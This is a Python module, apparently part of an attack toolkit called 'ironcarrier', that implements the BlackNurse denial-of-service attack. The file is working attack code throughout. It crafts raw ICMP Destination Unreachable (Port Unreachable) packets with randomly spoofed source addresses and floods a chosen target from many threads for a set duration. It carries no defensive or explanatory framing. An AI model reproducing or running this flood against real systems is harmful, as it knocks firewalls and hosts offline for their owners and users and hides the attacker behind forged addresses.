#!/usr/bin/env python3
"""
BlackNurse Vector
ICMP Type 3 Code 3 - Destination Unreachable: Port Unreachable
"""

import socket
import struct
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """BlackNurse ICMP attack vector"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        self.ttl = kwargs.get('ttl', 64)
        self._resolved_target = None
    
    def _resolve_target(self) -> str:
        if self._resolved_target:
            return self._resolved_target
        self._resolved_target = socket.gethostbyname(self.target)
        return self._resolved_target
    
    def _checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF
    
    def _build_packet(self) -> bytes:
        dst_ip = self._resolve_target()
        src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        
        orig_ip = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, 20,
            random.randint(0, 65535), 0, 64, 6, 0,
            socket.inet_aton(dst_ip),
            socket.inet_aton(src_ip)
        )
        orig_tcp = struct.pack('!HHI', random.randint(1, 65535), random.randint(1, 65535), 0)
        
        icmp_payload = orig_ip + orig_tcp
        icmp_packet = struct.pack('!BBH', 3, 3, 0) + icmp_payload
        checksum = self._checksum(icmp_packet)
        icmp_packet = struct.pack('!BBH', 3, 3, checksum) + icmp_payload
        
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, 20 + len(icmp_packet),
            random.randint(0, 65535), 0x4000, self.ttl, 1, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        
        return ip_header + icmp_packet
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end_time = time.time() + self.duration
        dst = (self._resolve_target(), 0)
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                sock.sendto(self._build_packet(), dst)
                self.stats.add_packets(1, 56)
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        self._resolve_target()
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
